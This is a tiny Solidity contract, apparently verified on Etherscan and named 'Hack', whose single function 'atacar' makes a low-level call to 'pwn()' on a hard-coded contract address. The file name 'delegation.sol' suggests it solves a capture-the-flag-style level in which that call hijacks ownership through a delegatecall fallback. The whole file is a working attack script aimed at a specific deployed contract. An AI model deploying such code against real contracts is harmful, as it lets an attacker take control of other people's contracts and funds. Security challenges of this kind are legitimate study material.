/**
 *Submitted for verification at Etherscan.io on 2021-10-11
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;



// File: delegation.sol

contract Hack {
    address ataque = 0xA2429FC9d309311DB7efB714345903C23c3B5738;
    function atacar () public {
        ataque.call(abi.encodeWithSignature("pwn()"));
    }
}